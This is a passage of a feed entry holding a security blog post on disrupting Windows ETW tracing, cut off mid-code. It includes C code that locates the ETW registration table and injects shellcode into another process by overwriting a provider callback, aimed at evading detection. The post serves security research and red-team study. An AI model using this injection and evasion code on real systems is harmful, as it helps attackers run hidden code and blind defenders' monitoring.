                    "scheme": null,
                    "label": null
                },
                {
                    "term": "process injection",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "redteam",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "security",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "shellcode",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "windows",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "amsi",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "clr",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "internals",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "http://modexp.wordpress.com/?p=4587",
            "guidislink": false,
            "summary": "Contents Introduction Registering Providers Locating the Registration Table Parsing the Registration Table Code Redirection Disable Tracing Further Research 1. Introduction This post briefly describes some techniques used by Red Teams to disrupt detection of malicious activity by the Event Tracing &#8230; <a href=\"https://modexp.wordpress.com/2020/04/08/red-teams-etw/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Contents Introduction Registering Providers Locating the Registration Table Parsing the Registration Table Code Redirection Disable Tracing Further Research 1. Introduction This post briefly describes some techniques used by Red Teams to disrupt detection of malicious activity by the Event Tracing &#8230; <a href=\"https://modexp.wordpress.com/2020/04/08/red-teams-etw/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://modexp.wordpress.com/feed/",
                    "value": "<h2>Contents</h2>\n<ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#intro\">Introduction</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#register\">Registering Providers</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#locate\">Locating the Registration Table</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#parse\">Parsing the Registration Table</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#inject\">Code Redirection</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#disable\">Disable Tracing</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#research\">Further Research</a></li>\n</ol>\n<h2 id=\"intro\">1. Introduction</h2>\n<p>This post briefly describes some techniques used by Red Teams to disrupt detection of malicious activity by the Event Tracing facility for Windows. It&#8217;s relatively easy to find information about registered ETW providers in memory and use it to disable tracing or perform code redirection. Since 2012, <a href=\"http://redplait.blogspot.com/2019/11/last-version-of-wincheck.html\">wincheck</a> provides an option to list <a href=\"http://redplait.blogspot.com/2012/03/etweventregister-on-w8-consumer-preview.html\">ETW registrations</a>, so what&#8217;s discussed here isn&#8217;t all that new. Rather than explain how ETW works and the purpose of it, please refer to a list of links <a href=\"https://modexp.wordpress.com/feed/#research\">here</a>. For this post, I took inspiration from <a href=\"https://blog.xpnsec.com/hiding-your-dotnet-etw/\">Hiding your .NET &#8211; ETW</a> by <a href=\"https://twitter.com/_xpn_\">Adam Chester</a> that includes a <a href=\"https://gist.github.com/xpn/fabc89c6dc52e038592f3fb9d1374673\">PoC for EtwEventWrite</a>. There&#8217;s also a PoC called <a href=\"https://github.com/outflanknl/TamperETW\">TamperETW</a>, by <a href=\"https://twitter.com/Cneelis\">Cornelis de Plaa</a>. A PoC to accompany this post can be <a href=\"https://github.com/odzhan/injection/tree/master/etw\">found here.</a></p>\n<h2 id=\"register\">2. Registering Providers</h2>\n<p>At a high-level, providers register using the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/evntprov/nf-evntprov-eventregister\">advapi32!EventRegister</a> API, which is usually forwarded to <a href=\"https://www.geoffchappell.com/studies/windows/win32/ntdll/api/etw/index.htm\">ntdll!EtwEventRegister</a>. This API validates arguments and forwards them to <a href=\"http://www.geoffchappell.com/studies/windows/win32/ntdll/api/etw/evntapi/notificationregister.htm\">ntdll!EtwNotificationRegister.</a> The caller provides a unique GUID that normally represents a well-known provider on the system, an optional callback function and an optional callback context.</p>\n<p>Registration handles are the memory address of an entry combined with table index shifted left by 48-bits. This may be used later with <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/evntprov/nf-evntprov-eventunregister\">EventUnregister</a> to disable tracing. The main functions of interest to us are those responsible for creating registration entries and storing them in memory. <strong>ntdll!EtwpAllocateRegistration</strong> tells us the size of the structure is 256 bytes. Functions that read and write entries tell us what most of the fields are used for.</h2>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _ETW_USER_REG_ENTRY <span style=\"color: #800080;\">{</span>\n    RTL_BALANCED_NODE   RegList<span style=\"color: #800080;\">;</span>           <span style=\"color: #696969;\">// List of registration entries</span>\n    ULONG64             Padding1<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">GUID</span>                ProviderId<span style=\"color: #800080;\">;</span>        <span style=\"color: #696969;\">// GUID to identify Provider</span>\n    PETWENABLECALLBACK  Callback<span style=\"color: #800080;\">;</span>          <span style=\"color: #696969;\">// Callback function executed in response to NtControlTrace</span>\n    <span style=\"color: #603000;\">PVOID</span>               CallbackContext<span style=\"color: #800080;\">;</span>   <span style=\"color: #696969;\">// Optional context</span>\n    SRWLOCK             RegLock<span style=\"color: #800080;\">;</span>           <span style=\"color: #696969;\">// </span>\n    SRWLOCK             NodeLock<span style=\"color: #800080;\">;</span>          <span style=\"color: #696969;\">// </span>\n    <span style=\"color: #603000;\">HANDLE</span>              Thread<span style=\"color: #800080;\">;</span>            <span style=\"color: #696969;\">// Handle of thread for callback</span>\n    <span style=\"color: #603000;\">HANDLE</span>              ReplyHandle<span style=\"color: #800080;\">;</span>       <span style=\"color: #696969;\">// Used to communicate with the kernel via NtTraceEvent</span>\n    <span style=\"color: #603000;\">USHORT</span>              RegIndex<span style=\"color: #800080;\">;</span>          <span style=\"color: #696969;\">// Index in EtwpRegistrationTable</span>\n    <span style=\"color: #603000;\">USHORT</span>              RegType<span style=\"color: #800080;\">;</span>           <span style=\"color: #696969;\">// 14th bit indicates a private</span>\n    ULONG64             Unknown<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">19</span><span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span> ETW_USER_REG_ENTRY<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PETW_USER_REG_ENTRY<span style=\"color: #800080;\">;</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-04-08 18:19:08 UTC --></p>\n<p><strong>ntdll!EtwpInsertRegistration</strong> tells us where all the entries are stored. For Windows 10, they can be found in a global variable called <strong>ntdll!EtwpRegistrationTable</strong>.</p>\n<h2 id=\"locate\">3. Locating the Registration Table</h2>\n<p>A number of functions reference it, but none are public.</p>\n<ul>\n<li>EtwpRemoveRegistrationFromTable</li>\n<li>EtwpGetNextRegistration</li>\n<li>EtwpFindRegistration</li>\n<li>EtwpInsertRegistration</li>\n</ul>\n<p>Since we know the type of structures to look for in memory, a good old brute force search of the .data section in ntdll.dll is enough to find it.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #603000;\">LPVOID</span> etw_get_table_va<span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">VOID</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">LPVOID</span>                m<span style=\"color: #808030;\">,</span> va <span style=\"color: #808030;\">=</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #800080;\">;</span>\n    PIMAGE_DOS_HEADER     dos<span style=\"color: #800080;\">;</span>\n    PIMAGE_NT_HEADERS     nt<span style=\"color: #800080;\">;</span>\n    PIMAGE_SECTION_HEADER sh<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">DWORD</span>                 i<span style=\"color: #808030;\">,</span> cnt<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PULONG_PTR</span>            ds<span style=\"color: #800080;\">;</span>\n    PRTL_RB_TREE          rbt<span style=\"color: #800080;\">;</span>\n    PETW_USER_REG_ENTRY   re<span style=\"color: #800080;\">;</span>\n    \n    m   <span style=\"color: #808030;\">=</span> <span style=\"color: #400000;\">GetModuleHandle</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">ntdll.dll</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    dos <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>PIMAGE_DOS_HEADER<span style=\"color: #808030;\">)</span>m<span style=\"color: #800080;\">;</span>  \n    nt  <span style=\"color: #808030;\">=</span> RVA2VA<span style=\"color: #808030;\">(</span>PIMAGE_NT_HEADERS<span style=\"color: #808030;\">,</span> m<span style=\"color: #808030;\">,</span> dos<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>e_lfanew<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>  \n    sh  <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>PIMAGE_SECTION_HEADER<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">LPBYTE</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">&amp;</span>nt<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>OptionalHeader <span style=\"color: #808030;\">+</span> \n            nt<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>FileHeader<span style=\"color: #808030;\">.</span>SizeOfOptionalHeader<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// locate the .data segment, save VA and number of pointers</span>\n    <span style=\"color: #800000; font-weight: bold;\">for</span><span style=\"color: #808030;\">(</span>i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span>nt<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>FileHeader<span style=\"color: #808030;\">.</span>NumberOfSections<span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PDWORD</span><span style=\"color: #808030;\">)</span>sh<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">.</span>Name <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PDWORD</span><span style=\"color: #808030;\">)</span><span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">.data</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        ds  <span style=\"color: #808030;\">=</span> RVA2VA<span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PULONG_PTR</span><span style=\"color: #808030;\">,</span> m<span style=\"color: #808030;\">,</span> sh<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">.</span>VirtualAddress<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        cnt <span style=\"color: #808030;\">=</span> sh<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">.</span>Misc<span style=\"color: #808030;\">.</span>VirtualSize <span style=\"color: #808030;\">/</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">ULONG_PTR</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        <span style=\"color: #800000; font-weight: bold;\">break</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800080;\">}</span>\n    <span style=\"color: #800080;\">}</span>\n    \n    <span style=\"color: #696969;\">// For each pointer minus one</span>\n    <span style=\"color: #800000; font-weight: bold;\">for</span><span style=\"color: #808030;\">(</span>i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span>cnt <span style=\"color: #808030;\">-</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      rbt <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>PRTL_RB_TREE<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">&amp;</span>ds<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #696969;\">// Skip pointers that aren't heap memory</span>\n      <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">!</span>IsHeapPtr<span style=\"color: #808030;\">(</span>rbt<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>Root<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800000; font-weight: bold;\">continue</span><span style=\"color: #800080;\">;</span>\n      \n      <span style=\"color: #696969;\">// It might be the registration table.</span>\n      <span style=\"color: #696969;\">// Check if the callback is code</span>\n      re <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>PETW_USER_REG_ENTRY<span style=\"color: #808030;\">)</span>rbt<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>Root<span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">!</span>IsCodePtr<span style=\"color: #808030;\">(</span>re<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>Callback<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800000; font-weight: bold;\">continue</span><span style=\"color: #800080;\">;</span>\n      \n      <span style=\"color: #696969;\">// Save the virtual address and exit loop</span>\n      va <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">&amp;</span>ds<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800000; font-weight: bold;\">break</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    <span style=\"color: #800000; font-weight: bold;\">return</span> va<span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-04-07 00:55:35 UTC --></p>\n<h2 id=\"parse\">4. Parsing the Registration Table</h2>\n<p><a href=\"https://github.com/odzhan/injection/tree/master/etw\">ETW Dump</a> can display information about each ETW provider in the registration table of one or more processes. The name of a provider (with exception to private providers) is obtained using <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/pla/nn-pla-itracedataprovider\">ITraceDataProvider::get_DisplayName.</a> This method uses the <a href=\"https://docs.microsoft.com/en-us/windows/win32/etw/retrieving-event-data-using-tdh\">Trace Data Helper API</a> which internally queries WMI.</p>\n<pre>\nNode        : 00000267F0961D00\nGUID        : {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4} (.NET Common Language Runtime)\nDescription : Microsoft .NET Runtime Common Language Runtime - WorkStation\nCallback    : 00007FFC7AB4B5D0 : clr!McGenControlCallbackV2\nContext     : 00007FFC7B0B3130 : clr!MICROSOFT_WINDOWS_DOTNETRUNTIME_PROVIDER_Context\nIndex       : 108\nReg Handle  : 006C0267F0961D00\n</pre>\n<h2 id=\"inject\">5. Code Redirection</h2>\n<p>The Callback function for a provider is invoked in request by the kernel to enable or disable tracing. For the CLR, the relevant function is <strong>clr!McGenControlCallbackV2</strong>. Code redirection is achieved by simply replacing the callback address with the address of a new callback. Of course, it must use the same prototype, otherwise the host process will crash once the callback finishes executing. We can invoke a new callback using the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/evntrace/nf-evntrace-starttracea\">StartTrace</a> and <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/evntrace/nf-evntrace-enabletraceex\">EnableTraceEx</a> API, although there may be a simpler way via <a href=\"http://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/etw/traceapi/control/index.htm\">NtTraceControl.</a></p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #696969;\">// inject shellcode into process using ETW registration entry</span>\n<span style=\"color: #603000;\">BOOL</span> etw_inject<span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">DWORD</span> pid<span style=\"color: #808030;\">,</span> <span style=\"color: #603000;\">PWCHAR</span> path<span style=\"color: #808030;\">,</span> <span style=\"color: #603000;\">PWCHAR</span> prov<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    RTL_RB_TREE             tree<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PVOID</span>                   etw<span style=\"color: #808030;\">,</span> pdata<span style=\"color: #808030;\">,</span> cs<span style=\"color: #808030;\">,</span> callback<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">HANDLE</span>                  hp<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">SIZE_T</span>                  rd<span style=\"color: #808030;\">,</span> wr<span style=\"color: #800080;\">;</span>\n    ETW_USER_REG_ENTRY      re<span style=\"color: #800080;\">;</span>\n    PRTL_BALANCED_NODE      node<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">OLECHAR</span>                 id<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">40</span><span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n    TRACEHANDLE             ht<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">DWORD</span>                   plen<span style=\"color: #808030;\">,</span> bufferSize<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">PWCHAR</span>                  name<span style=\"color: #800080;\">;</span>\n    PEVENT_TRACE_PROPERTIES prop<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">BOOL</span>                    status <span style=\"color: #808030;\">=</span> FALSE<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800000; font-weight: bold;\">const</span> <span style=\"color: #800000; font-weight: bold;\">wchar_t</span>           etwname<span style=\"color: #808030;\">[</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">=</span><span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">etw_injection</span><span style=\"color: #0f69ff;\">\\0</span><span style=\"color: #800000;\">\"</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>path <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800000; font-weight: bold;\">return</span> FALSE<span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// try read shellcode into memory</span>\n    plen <span style=\"color: #808030;\">=</span> readpic<span style=\"color: #808030;\">(</span>path<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>pdata<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>plen <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span> \n      <span style=\"color: #603000;\">wprintf</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">ERROR: Unable to read shellcode from </span><span style=\"color: #007997;\">%s</span><span style=\"color: #0f69ff;\">\\n</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> path<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span> \n      <span style=\"color: #800000; font-weight: bold;\">return</span> FALSE<span style=\"color: #800080;\">;</span> \n    <span style=\"color: #800080;\">}</span>\n    \n    <span style=\"color: #696969;\">// try obtain the VA of ETW registration table</span>\n    etw <span style=\"color: #808030;\">=</span> etw_get_table_va<span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>etw <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      <span style=\"color: #603000;\">wprintf</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">ERROR: Unable to obtain address of ETW Registration Table.</span><span style=\"color: #0f69ff;\">\\n</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800000; font-weight: bold;\">return</span> FALSE<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    \n    <span style=\"color: #603000;\">printf</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">*********************************************</span><span style=\"color: #0f69ff;\">\\n</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #603000;\">printf</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">EtwpRegistrationTable for </span><span style=\"color: #007997;\">%i</span><span style=\"color: #0000e6;\"> found at </span><span style=\"color: #007997;\">%p</span><span style=\"color: #0f69ff;\">\\n</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> pid<span style=\"color: #808030;\">,</span> etw<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>  \n    \n    <span style=\"color: #696969;\">// try open target process</span>\n    hp <span style=\"color: #808030;\">=</span> <span style=\"color: #400000;\">OpenProcess</span><span style=\"color: #808030;\">(</span><span style=\"color: #7d0045;\">PROCESS_ALL_ACCESS</span><span style=\"color: #808030;\">,</span> FALSE<span style=\"color: #808030;\">,</span> pid<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>hp <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      xstrerror<span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">OpenProcess(</span><span style=\"color: #007997;\">%ld</span><span style=\"color: #0000e6;\">)</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> pid<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #800000; font-weight: bold;\">return</span> FALSE<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    \n    <span style=\"color: #696969;\">// use (Microsoft-Windows-User-Diagnostic) unless specified</span>\n    \n    node <span style=\"color: #808030;\">=</span> etw_get_reg<span style=\"color: #808030;\">(</span>\n      hp<span style=\"color: #808030;\">,</span> \n      etw<span style=\"color: #808030;\">,</span> \n      prov <span style=\"color: #808030;\">!</span><span style=\"color: #808030;\">=</span> <span style=\"color: #7d0045;\">NULL</span> <span style=\"color: #800080;\">?</span> prov <span style=\"color: #800080;\">:</span> <span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">{305FC87B-002A-5E26-D297-60223012CA9C}</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> \n      <span style=\"color: #808030;\">&amp;</span>re<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>node <span style=\"color: #808030;\">!</span><span style=\"color: #808030;\">=</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      <span style=\"color: #696969;\">// convert GUID to string and display name</span>\n      <span style=\"color: #400000;\">StringFromGUID2</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">&amp;</span>re<span style=\"color: #808030;\">.</span>ProviderId<span style=\"color: #808030;\">,</span> id<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>id<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      name <span style=\"color: #808030;\">=</span> etw_id2name<span style=\"color: #808030;\">(</span>id<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        \n      <span style=\"color: #603000;\">wprintf</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">Address of remote node  : </span><span style=\"color: #007997;\">%p</span><span style=\"color: #0f69ff;\">\\n</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PVOID</span><span style=\"color: #808030;\">)</span>node<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      <span style=\"color: #603000;\">wprintf</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">Using </span><span style=\"color: #007997;\">%s</span><span style=\"color: #0000e6;\"> (</span><span style=\"color: #007997;\">%s</span><span style=\"color: #0000e6;\">)</span><span style=\"color: #0f69ff;\">\\n</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> id<span style=\"color: #808030;\">,</span> name<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n      \n      <span style=\"color: #696969;\">// allocate memory for shellcode</span>\n      cs <span style=\"color: #808030;\">=</span> <span style=\"color: #400000;\">VirtualAllocEx</span><span style=\"color: #808030;\">(</span>\n        hp<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> plen<span style=\"color: #808030;\">,</span> \n        MEM_COMMIT <span style=\"color: #808030;\">|</span> MEM_RESERVE<span style=\"color: #808030;\">,</span> \n        PAGE_EXECUTE_READWRITE<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        \n      <span style=\"color: #800000; font-weight: bold;\">if</span><span style=\"color: #808030;\">(</span>cs <span style=\"color: #808030;\">!</span><span style=\"color: #808030;\">=</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        <span style=\"color: #603000;\">wprintf</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">Address of old callback : </span><span style=\"color: #007997;\">%p</span><span style=\"color: #0f69ff;\">\\n</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> re<span style=\"color: #808030;\">.</span>Callback<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        <span style=\"color: #603000;\">wprintf</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">Address of new callback : </span><span style=\"color: #007997;\">%p</span><span style=\"color: #0f69ff;\">\\n</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> cs<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        \n        <span style=\"color: #696969;\">// write shellcode</span>\n        <span style=\"color: #400000;\">WriteProcessMemory</span><span style=\"color: #808030;\">(</span>hp<span style=\"color: #808030;\">,</span> cs<span style=\"color: #808030;\">,</span> pdata<span style=\"color: #808030;\">,</span> plen<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>wr<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n          \n        <span style=\"color: #696969;\">// initialize trace</span>\n        bufferSize <span style=\"color: #808030;\">=</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>EVENT_TRACE_PROPERTIES<span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> \n                     <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>etwname<span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">2</span><span style=\"color: #800080;\">;</span>\n\n        prop <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>EVENT_TRACE_PROPERTIES<span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">)</span><span style=\"color: #400000;\">LocalAlloc</span><span style=\"color: #808030;\">(</span>LPTR<span style=\"color: #808030;\">,</span> bufferSize<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        prop<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>Wnode<span style=\"color: #808030;\">.</span>BufferSize    <span style=\"color: #808030;\">=</span> bufferSize<span style=\"color: #800080;\">;</span>\n        prop<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">&gt;</span>Wnode<span style=\"color: #808030;\">.</span>ClientContext <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">2</span><span style=\"color: #800080;\">;</span>\n        prop<span style=\"color: #808030;\">-</span><span style=\"color: 